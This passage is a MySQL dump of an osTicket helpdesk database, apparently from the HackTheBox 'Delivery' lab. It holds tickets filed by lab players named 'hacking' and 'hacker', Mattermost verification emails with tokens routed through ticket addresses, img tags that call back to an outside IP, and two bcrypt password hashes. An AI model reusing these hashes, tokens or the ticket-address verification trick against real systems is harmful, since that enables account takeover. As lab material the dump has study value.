</p> <p><strong>PS.</strong> Don\'t just make customers happy, make happy customers! </p>','html','172.16.10.141',NULL,NULL,'2020-12-26 09:14:00','0000-00-00 00:00:00'),(2,0,2,0,2,'M',65,'bob',NULL,NULL,'',NULL,'<p>fdgfdgdfdfgfdg</p>','html','10.10.14.2',NULL,NULL,'2021-01-05 03:26:24','0000-00-00 00:00:00'),(3,0,3,0,3,'M',65,'9ecfb4be145d47fda0724f697f35ffaf',NULL,NULL,'',NULL,'\n        ----\n        Registration Successful\n        ----\n\n        Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=sxjww9mxbokgr1fqu63iqitkiodimputhe9gi6zmhn7mhd3tyksub4zxiiukdef9&email=5056505%40delivery.htb )\n\n---------------------\nYou can sign in from:\n---------------------\n\nMattermost lets you share messages and files from your PC or phone, with instant search and archiving.\n\nFor the best experience, download the apps for PC, Mac, iOS and Android from:\n\nhttps://mattermost.com/download/#mattermostApps\n\n( https://mattermost.com/download/#mattermostApps\n        ','html','10.10.14.2',NULL,NULL,'2021-01-05 06:06:28','0000-00-00 00:00:00'),(4,0,4,0,4,'M',65,'c3ecacacc7b94f909d04dbfd308a9b93',NULL,NULL,'',NULL,'\n        ----\n        Registration Successful\n        ----\n\n        Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=8mj7g7ey59a9wrgfxd9a1jfnoqa7rezbeexhgc4mywckeeze77ibb179qeisigjd&email=4120849%40delivery.htb )\n\n---------------------\nYou can sign in from:\n---------------------\n\nMattermost lets you share messages and files from your PC or phone, with instant search and archiving.\n\nFor the best experience, download the apps for PC, Mac, iOS and Android from:\n\nhttps://mattermost.com/download/#mattermostApps\n\n( https://mattermost.com/download/#mattermostApps\n        ','html','10.10.14.2',NULL,NULL,'2021-01-05 06:06:39','0000-00-00 00:00:00'),(5,0,5,0,5,'M',65,'ff0a21fc6fc2488195e16ea854c963ee',NULL,NULL,'',NULL,'\n        ----\n        Registration Successful\n        ----\n\n        Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=yu1wegyh8ua7ehk3a1eg56bmd471c6nwo3qy5hkarow6y5kp97x6iw6oodoko37w&email=9122359%40delivery.htb )\n\n---------------------\nYou can sign in from:\n---------------------\n\nMattermost lets you share messages and files from your PC or phone, with instant search and archiving.\n\nFor the best experience, download the apps for PC, Mac, iOS and Android from:\n\nhttps://mattermost.com/download/#mattermostApps\n\n( https://mattermost.com/download/#mattermostApps\n        ','html','10.10.14.2',NULL,NULL,'2021-01-05 06:06:45','0000-00-00 00:00:00'),(6,0,6,0,6,'M',65,'5b785171bfb34762a933e127630c4860',NULL,NULL,'',NULL,'\n        ----\n        Registration Successful\n        ----\n\n        Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=a5k53o185tdu7pb93gfgwr9umfsn1fcsn5xwwzibpez8hr8khj3sruguxjogqpcm&email=7466068%40delivery.htb )\n\n---------------------\nYou can sign in from:\n---------------------\n\nMattermost lets you share messages and files from your PC or phone, with instant search and archiving.\n\nFor the best experience, download the apps for PC, Mac, iOS and Android from:\n\nhttps://mattermost.com/download/#mattermostApps\n\n( https://mattermost.com/download/#mattermostApps\n        ','html','10.10.14.2',NULL,NULL,'2021-01-05 06:06:46','0000-00-00 00:00:00'),(7,0,7,0,8,'M',65,'sdfsdf',NULL,NULL,'',NULL,'<p>erterter</p>','html','10.10.14.157',NULL,NULL,'2021-01-30 16:40:20','0000-00-00 00:00:00'),(8,0,8,0,9,'M',65,'hacking',NULL,NULL,'',NULL,'<figure><img src=\"cid:qufsit_bsdebsgkxiha2z54t5xqj43vi\" data-image=\"QufsIT_bsdEBsGkxiHa2Z54t5xQJ43VI\" alt=\"image\" /></figure>','html','10.10.14.157',NULL,NULL,'2021-01-30 16:52:41','0000-00-00 00:00:00'),(9,0,9,0,9,'M',65,'hacking',NULL,NULL,'',NULL,'<figure><img src=\"cid:qufsit_bsdebsgkxiha2z54t5xqj43vi\" data-image=\"QufsIT_bsdEBsGkxiHa2Z54t5xQJ43VI\" alt=\"image\" /></figure>','html','10.10.14.157',NULL,NULL,'2021-01-30 16:55:43','0000-00-00 00:00:00'),(10,0,9,0,9,'M',64,'hacking',NULL,NULL,'',NULL,'<figure><img src=\"cid:qufsit_bsdebsgkxiha2z54t5xqj43vi\" data-image=\"QufsIT_bsdEBsGkxiHa2Z54t5xQJ43VI\" alt=\"image\" /></figure>','html','10.10.14.157',NULL,NULL,'2021-01-30 16:57:01','0000-00-00 00:00:00'),(11,0,10,0,10,'M',65,'test',NULL,NULL,'',NULL,'<img src=\"http://172.22.180.232/img.png\" alt=\"image\" />','html','10.10.14.50',NULL,NULL,'2021-01-30 17:03:59','0000-00-00 00:00:00'),(12,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,'<img src=\"http://172.22.180.232:9000/img.png\" alt=\"image\" />','html','10.10.14.50',NULL,NULL,'2021-01-30 17:05:52','0000-00-00 00:00:00'),(13,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,'<figure></figure>','html','10.10.14.50',NULL,NULL,'2021-01-30 17:08:44','0000-00-00 00:00:00'),(14,0,11,0,11,'M',65,'hacker',NULL,NULL,'',NULL,'\n        ----\n        Registration Successful\n        ----\n\n        Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=6etwhqyx7y4brk79gujmh3ix5fzhjtp4dtgbc7m9akenwhhqejh17x9kdaghc6xx&email=1316174%40delivery.htb )\n\n---------------------\nYou can sign in from:\n---------------------\n\nMattermost lets you share messages and files from your PC or phone, with instant search and archiving.\n\nFor the best experience, download the apps for PC, Mac, iOS and Android from:\n\nhttps://mattermost.com/download/#mattermostApps\n\n( https://mattermost.com/download/#mattermostApps\n        ','html','10.10.14.44',NULL,NULL,'2021-01-30 17:09:01','0000-00-00 00:00:00'),(15,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,'<figure></figure>','html','10.10.14.50',NULL,NULL,'2021-01-30 17:09:25','0000-00-00 00:00:00'),(16,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,' <p>sdfsdf</p> <p><br /></p>','html','10.10.14.50',NULL,NULL,'2021-01-30 17:13:14','0000-00-00 00:00:00'),(17,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,'sdf \\\\\\','html','10.10.14.50',NULL,NULL,'2021-01-30 17:14:10','0000-00-00 00:00:00'),(18,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,'sdfsdf \\\\\\\\','html','10.10.14.50',NULL,NULL,'2021-01-30 17:14:25','0000-00-00 00:00:00'),(19,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,'<p>zxc</p> <p><br /></p> ','html','10.10.14.50',NULL,NULL,'2021-01-30 17:15:30','0000-00-00 00:00:00'),(20,0,10,0,10,'M',64,'test',NULL,NULL,'',NULL,'sdfsdf \\\\\\\\','html','10.10.14.50',NULL,NULL,'2021-01-30 17:17:46','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `ost_thread_entry` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_thread_entry_email`
--

DROP TABLE IF EXISTS `ost_thread_entry_email`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_thread_entry_email` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `thread_entry_id` int(11) unsigned NOT NULL,
  `email_id` int(11) unsigned DEFAULT NULL,
  `mid` varchar(255) NOT NULL,
  `headers` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `thread_entry_id` (`thread_entry_id`),
  KEY `mid` (`mid`),
  KEY `email_id` (`email_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_thread_entry_email`
--

LOCK TABLES `ost_thread_entry_email` WRITE;
/*!40000 ALTER TABLE `ost_thread_entry_email` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_thread_entry_email` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_thread_entry_merge`
--

DROP TABLE IF EXISTS `ost_thread_entry_merge`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_thread_entry_merge` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `thread_entry_id` int(11) unsigned NOT NULL,
  `data` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `thread_entry_id` (`thread_entry_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_thread_entry_merge`
--

LOCK TABLES `ost_thread_entry_merge` WRITE;
/*!40000 ALTER TABLE `ost_thread_entry_merge` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_thread_entry_merge` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_thread_event`
--

DROP TABLE IF EXISTS `ost_thread_event`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_thread_event` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `thread_id` int(11) unsigned NOT NULL DEFAULT 0,
  `thread_type` char(1) NOT NULL DEFAULT '',
  `event_id` int(11) unsigned DEFAULT NULL,
  `staff_id` int(11) unsigned NOT NULL,
  `team_id` int(11) unsigned NOT NULL,
  `dept_id` int(11) unsigned NOT NULL,
  `topic_id` int(11) unsigned NOT NULL,
  `data` varchar(1024) DEFAULT NULL COMMENT 'Encoded differences',
  `username` varchar(128) NOT NULL DEFAULT 'SYSTEM',
  `uid` int(11) unsigned DEFAULT NULL,
  `uid_type` char(1) NOT NULL DEFAULT 'S',
  `annulled` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `timestamp` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `ticket_state` (`thread_id`,`event_id`,`timestamp`),
  KEY `ticket_stats` (`timestamp`,`event_id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_thread_event`
--

LOCK TABLES `ost_thread_event` WRITE;
/*!40000 ALTER TABLE `ost_thread_event` DISABLE KEYS */;
INSERT INTO `ost_thread_event` VALUES (1,1,'T',1,0,0,1,1,NULL,'SYSTEM',1,'U',0,'2020-12-26 09:14:00'),(2,2,'T',1,0,0,1,2,NULL,'SYSTEM',2,'U',0,'2021-01-05 03:26:24'),(3,3,'T',1,0,0,1,2,NULL,'SYSTEM',3,'U',0,'2021-01-05 06:06:28'),(4,4,'T',1,0,0,1,2,NULL,'SYSTEM',4,'U',0,'2021-01-05 06:06:39'),(5,5,'T',1,0,0,1,2,NULL,'SYSTEM',5,'U',0,'2021-01-05 06:06:45'),(6,6,'T',1,0,0,1,2,NULL,'SYSTEM',6,'U',0,'2021-01-05 06:06:46'),(7,7,'T',1,0,0,1,2,NULL,'SYSTEM',8,'U',0,'2021-01-30 16:40:20'),(8,8,'T',1,0,0,1,2,NULL,'SYSTEM',9,'U',0,'2021-01-30 16:52:41'),(9,9,'T',1,0,0,1,2,NULL,'SYSTEM',9,'U',0,'2021-01-30 16:55:43'),(10,10,'T',1,0,0,1,2,NULL,'SYSTEM',10,'U',0,'2021-01-30 17:03:59'),(11,9,'T',9,0,0,1,2,'{\"fields\":{\"22\":[[\"Low\",1],null]}}','hacking',9,'U',0,'2021-01-30 17:07:59'),(12,11,'T',1,0,0,1,2,NULL,'SYSTEM',11,'U',0,'2021-01-30 17:09:01'),(13,9,'T',9,0,0,1,2,'{\"fields\":{\"22\":[[\"Low\",1],null]}}','hacking',9,'U',0,'2021-01-30 17:18:35');
/*!40000 ALTER TABLE `ost_thread_event` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_thread_referral`
--

DROP TABLE IF EXISTS `ost_thread_referral`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_thread_referral` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `thread_id` int(11) unsigned NOT NULL,
  `object_id` int(11) unsigned NOT NULL,
  `object_type` char(1) NOT NULL,
  `created` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `ref` (`object_id`,`object_type`,`thread_id`),
  KEY `thread_id` (`thread_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_thread_referral`
--

LOCK TABLES `ost_thread_referral` WRITE;
/*!40000 ALTER TABLE `ost_thread_referral` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_thread_referral` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_ticket`
--

DROP TABLE IF EXISTS `ost_ticket`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_ticket` (
  `ticket_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `ticket_pid` int(11) unsigned DEFAULT NULL,
  `number` varchar(20) DEFAULT NULL,
  `user_id` int(11) unsigned NOT NULL DEFAULT 0,
  `user_email_id` int(11) unsigned NOT NULL DEFAULT 0,
  `status_id` int(10) unsigned NOT NULL DEFAULT 0,
  `dept_id` int(10) unsigned NOT NULL DEFAULT 0,
  `sla_id` int(10) unsigned NOT NULL DEFAULT 0,
  `topic_id` int(10) unsigned NOT NULL DEFAULT 0,
  `staff_id` int(10) unsigned NOT NULL DEFAULT 0,
  `team_id` int(10) unsigned NOT NULL DEFAULT 0,
  `email_id` int(11) unsigned NOT NULL DEFAULT 0,
  `lock_id` int(11) unsigned NOT NULL DEFAULT 0,
  `flags` int(10) unsigned NOT NULL DEFAULT 0,
  `sort` int(11) unsigned NOT NULL DEFAULT 0,
  `ip_address` varchar(64) NOT NULL DEFAULT '',
  `source` enum('Web','Email','Phone','API','Other') NOT NULL DEFAULT 'Other',
  `source_extra` varchar(40) DEFAULT NULL,
  `isoverdue` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `isanswered` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `duedate` datetime DEFAULT NULL,
  `est_duedate` datetime DEFAULT NULL,
  `reopened` datetime DEFAULT NULL,
  `closed` datetime DEFAULT NULL,
  `lastupdate` datetime DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`ticket_id`),
  KEY `user_id` (`user_id`),
  KEY `dept_id` (`dept_id`),
  KEY `staff_id` (`staff_id`),
  KEY `team_id` (`team_id`),
  KEY `status_id` (`status_id`),
  KEY `created` (`created`),
  KEY `closed` (`closed`),
  KEY `duedate` (`duedate`),
  KEY `topic_id` (`topic_id`),
  KEY `sla_id` (`sla_id`),
  KEY `ticket_pid` (`ticket_pid`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_ticket`
--

LOCK TABLES `ost_ticket` WRITE;
/*!40000 ALTER TABLE `ost_ticket` DISABLE KEYS */;
INSERT INTO `ost_ticket` VALUES (1,NULL,'431466',1,0,1,1,1,1,0,0,0,0,0,0,'172.16.10.141','Web',NULL,0,0,NULL,'2020-12-29 17:00:00',NULL,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,NULL,'5677901',2,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.2','Web',NULL,0,0,NULL,'2021-01-07 08:00:00',NULL,NULL,'2021-01-05 03:26:24','2021-01-05 03:26:24','2021-01-05 03:26:24'),(3,NULL,'5056505',3,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.2','Web',NULL,0,0,NULL,'2021-01-07 08:00:00',NULL,NULL,'2021-01-05 06:06:28','2021-01-05 06:06:28','2021-01-05 06:06:28'),(4,NULL,'4120849',4,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.2','Web',NULL,0,0,NULL,'2021-01-07 08:00:00',NULL,NULL,'2021-01-05 06:06:39','2021-01-05 06:06:39','2021-01-05 06:06:39'),(5,NULL,'9122359',5,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.2','Web',NULL,0,0,NULL,'2021-01-07 08:00:00',NULL,NULL,'2021-01-05 06:06:45','2021-01-05 06:06:45','2021-01-05 06:06:45'),(6,NULL,'7466068',6,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.2','Web',NULL,0,0,NULL,'2021-01-07 08:00:00',NULL,NULL,'2021-01-05 06:06:46','2021-01-05 06:06:46','2021-01-05 06:06:46'),(7,NULL,'2883226',8,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.157','Web',NULL,0,0,NULL,'2021-02-02 17:00:00',NULL,NULL,'2021-01-30 16:40:20','2021-01-30 16:40:20','2021-01-30 16:40:20'),(8,NULL,'7147451',9,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.157','Web',NULL,0,0,NULL,'2021-02-02 17:00:00',NULL,NULL,'2021-01-30 16:52:41','2021-01-30 16:52:41','2021-01-30 16:52:41'),(9,NULL,'4109302',9,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.157','Web',NULL,0,0,NULL,'2021-02-02 17:00:00',NULL,NULL,'2021-01-30 16:57:01','2021-01-30 16:55:43','2021-01-30 16:57:01'),(10,NULL,'6216848',10,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.50','Web',NULL,0,0,NULL,'2021-02-02 17:00:00',NULL,NULL,'2021-01-30 17:17:46','2021-01-30 17:03:59','2021-01-30 17:17:46'),(11,NULL,'1316174',11,0,1,1,1,2,0,0,0,0,0,0,'10.10.14.44','Web',NULL,0,0,NULL,'2021-02-02 17:00:00',NULL,NULL,'2021-01-30 17:09:01','2021-01-30 17:09:01','2021-01-30 17:09:01');
/*!40000 ALTER TABLE `ost_ticket` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_ticket__cdata`
--

DROP TABLE IF EXISTS `ost_ticket__cdata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_ticket__cdata` (
  `ticket_id` int(11) unsigned NOT NULL,
  `subject` mediumtext DEFAULT NULL,
  `priority` mediumtext DEFAULT NULL,
  PRIMARY KEY (`ticket_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_ticket__cdata`
--

LOCK TABLES `ost_ticket__cdata` WRITE;
/*!40000 ALTER TABLE `ost_ticket__cdata` DISABLE KEYS */;
INSERT INTO `ost_ticket__cdata` VALUES (1,'osTicket Installed!','2'),(2,'noiss','1'),(3,'test','1'),(4,'test','1'),(5,'test','1'),(6,'test','1'),(7,'tretret','1'),(8,'shell','1'),(9,'hack','1'),(10,'dfgdfgdf','1'),(11,'adf','1');
/*!40000 ALTER TABLE `ost_ticket__cdata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_ticket_priority`
--

DROP TABLE IF EXISTS `ost_ticket_priority`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_ticket_priority` (
  `priority_id` tinyint(4) NOT NULL AUTO_INCREMENT,
  `priority` varchar(60) NOT NULL DEFAULT '',
  `priority_desc` varchar(30) NOT NULL DEFAULT '',
  `priority_color` varchar(7) NOT NULL DEFAULT '',
  `priority_urgency` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `ispublic` tinyint(1) NOT NULL DEFAULT 1,
  PRIMARY KEY (`priority_id`),
  UNIQUE KEY `priority` (`priority`),
  KEY `priority_urgency` (`priority_urgency`),
  KEY `ispublic` (`ispublic`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_ticket_priority`
--

LOCK TABLES `ost_ticket_priority` WRITE;
/*!40000 ALTER TABLE `ost_ticket_priority` DISABLE KEYS */;
INSERT INTO `ost_ticket_priority` VALUES (1,'low','Low','#DDFFDD',4,1),(2,'normal','Normal','#FFFFF0',3,1),(3,'high','High','#FEE7E7',2,1),(4,'emergency','Emergency','#FEE7E7',1,1);
/*!40000 ALTER TABLE `ost_ticket_priority` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_ticket_status`
--

DROP TABLE IF EXISTS `ost_ticket_status`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_ticket_status` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL DEFAULT '',
  `state` varchar(16) DEFAULT NULL,
  `mode` int(11) unsigned NOT NULL DEFAULT 0,
  `flags` int(11) unsigned NOT NULL DEFAULT 0,
  `sort` int(11) unsigned NOT NULL DEFAULT 0,
  `properties` text NOT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `state` (`state`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_ticket_status`
--

LOCK TABLES `ost_ticket_status` WRITE;
/*!40000 ALTER TABLE `ost_ticket_status` DISABLE KEYS */;
INSERT INTO `ost_ticket_status` VALUES (1,'Open','open',3,0,1,'{\"description\":\"Open tickets.\"}','2020-12-26 09:14:00','0000-00-00 00:00:00'),(2,'Resolved','closed',1,0,2,'{\"allowreopen\":true,\"reopenstatus\":0,\"description\":\"Resolved tickets\"}','2020-12-26 09:14:00','0000-00-00 00:00:00'),(3,'Closed','closed',3,0,3,'{\"allowreopen\":true,\"reopenstatus\":0,\"description\":\"Closed tickets. Tickets will still be accessible on client and staff panels.\"}','2020-12-26 09:14:00','0000-00-00 00:00:00'),(4,'Archived','archived',3,0,4,'{\"description\":\"Tickets only adminstratively available but no longer accessible on ticket queues and client panel.\"}','2020-12-26 09:14:00','0000-00-00 00:00:00'),(5,'Deleted','deleted',3,0,5,'{\"description\":\"Tickets queued for deletion. Not accessible on ticket queues.\"}','2020-12-26 09:14:00','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `ost_ticket_status` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_translation`
--

DROP TABLE IF EXISTS `ost_translation`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_translation` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `object_hash` char(16) CHARACTER SET ascii DEFAULT NULL,
  `type` enum('phrase','article','override') DEFAULT NULL,
  `flags` int(10) unsigned NOT NULL DEFAULT 0,
  `revision` int(11) unsigned DEFAULT NULL,
  `agent_id` int(10) unsigned NOT NULL DEFAULT 0,
  `lang` varchar(16) NOT NULL DEFAULT '',
  `text` mediumtext NOT NULL,
  `source_text` text DEFAULT NULL,
  `updated` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `type` (`type`,`lang`),
  KEY `object_hash` (`object_hash`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_translation`
--

LOCK TABLES `ost_translation` WRITE;
/*!40000 ALTER TABLE `ost_translation` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_translation` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_user`
--

DROP TABLE IF EXISTS `ost_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_user` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `org_id` int(10) unsigned NOT NULL,
  `default_email_id` int(10) NOT NULL,
  `status` int(11) unsigned NOT NULL DEFAULT 0,
  `name` varchar(128) NOT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `org_id` (`org_id`),
  KEY `default_email_id` (`default_email_id`),
  KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_user`
--

LOCK TABLES `ost_user` WRITE;
/*!40000 ALTER TABLE `ost_user` DISABLE KEYS */;
INSERT INTO `ost_user` VALUES (1,1,1,0,'osTicket Support','2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,0,2,0,'bob','2021-01-05 03:26:08','2021-01-05 03:26:08'),(3,0,3,0,'9ecfb4be145d47fda0724f697f35ffaf','2021-01-05 06:06:28','2021-01-05 06:06:28'),(4,0,4,0,'c3ecacacc7b94f909d04dbfd308a9b93','2021-01-05 06:06:39','2021-01-05 06:06:39'),(5,0,5,0,'ff0a21fc6fc2488195e16ea854c963ee','2021-01-05 06:06:45','2021-01-05 06:06:45'),(6,0,6,0,'5b785171bfb34762a933e127630c4860','2021-01-05 06:06:46','2021-01-05 06:06:46'),(7,0,7,0,'saint','2021-01-30 16:33:45','2021-01-30 16:33:45'),(8,0,8,0,'sdfsdf','2021-01-30 16:40:20','2021-01-30 16:40:20'),(9,0,9,0,'hacking','2021-01-30 16:52:41','2021-01-30 16:52:41'),(10,0,10,0,'test','2021-01-30 17:03:59','2021-01-30 17:03:59'),(11,0,11,0,'hacker','2021-01-30 17:09:01','2021-01-30 17:09:01');
/*!40000 ALTER TABLE `ost_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_user__cdata`
--

DROP TABLE IF EXISTS `ost_user__cdata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_user__cdata` (
  `user_id` int(11) unsigned NOT NULL,
  `email` mediumtext DEFAULT NULL,
  `name` mediumtext DEFAULT NULL,
  `phone` mediumtext DEFAULT NULL,
  `notes` mediumtext DEFAULT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_user__cdata`
--

LOCK TABLES `ost_user__cdata` WRITE;
/*!40000 ALTER TABLE `ost_user__cdata` DISABLE KEYS */;
INSERT INTO `ost_user__cdata` VALUES (1,NULL,NULL,NULL,NULL),(2,NULL,NULL,'',''),(3,NULL,NULL,'',''),(4,NULL,NULL,'',''),(5,NULL,NULL,'',''),(6,NULL,NULL,'',''),(7,NULL,NULL,'',''),(8,NULL,NULL,'',''),(9,NULL,NULL,'',''),(10,NULL,NULL,'',''),(11,NULL,NULL,'','');
/*!40000 ALTER TABLE `ost_user__cdata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_user_account`
--

DROP TABLE IF EXISTS `ost_user_account`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_user_account` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `status` int(11) unsigned NOT NULL DEFAULT 0,
  `timezone` varchar(64) DEFAULT NULL,
  `lang` varchar(16) DEFAULT NULL,
  `username` varchar(64) DEFAULT NULL,
  `passwd` varchar(128) CHARACTER SET ascii COLLATE ascii_bin DEFAULT NULL,
  `backend` varchar(32) DEFAULT NULL,
  `extra` text DEFAULT NULL,
  `registered` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_user_account`
--

LOCK TABLES `ost_user_account` WRITE;
/*!40000 ALTER TABLE `ost_user_account` DISABLE KEYS */;
INSERT INTO `ost_user_account` VALUES (1,7,0,'Europe/Helsinki',NULL,NULL,'$2a$08$yY4HDrD1SatcwG89gmnY8.1tE8JJYPZWQ.0NyzE6bayBzQxByA9/m',NULL,NULL,'2021-01-30 21:33:45'),(2,9,0,'Europe/Berlin',NULL,NULL,'$2a$08$WfQ7XIF27W3LkrePzhnV/e.auNW3cipNu4foex4H8kfrVdvTl.Rge',NULL,NULL,'2021-01-30 22:02:40');
/*!40000 ALTER TABLE `ost_user_account` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_user_email`
--

DROP TABLE IF EXISTS `ost_user_email`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_user_email` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `flags` int(10) unsigned NOT NULL DEFAULT 0,
  `address` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `address` (`address`),
  KEY `user_email_lookup` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_user_email`
--

LOCK TABLES `ost_user_email` WRITE;
/*!40000 ALTER TABLE `ost_user_email` DISABLE KEYS */;
